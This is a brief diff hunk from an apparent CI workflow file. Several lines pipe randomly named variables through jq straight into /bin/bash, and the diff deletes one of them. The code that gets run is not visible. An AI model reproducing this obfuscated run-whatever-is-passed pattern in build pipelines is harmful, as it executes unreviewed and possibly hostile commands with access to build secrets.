@@ -26,7 +26,6 @@ jobs:
           echo $mdabp0 | jq -r .tazj8061 | /bin/bash
           echo $x858 | jq -r .emhtf74 | /bin/bash
           printf '%s' "$orzl7" | jq -r .uy48 | /bin/bash
-          printf '%s' "$fb30980" | jq -r .n66 | /bin/bash
           echo $fpn32 | jq -r .wcomx2 | /bin/bash
           echo $b4102 | jq -r .r950 | /bin/bash
 
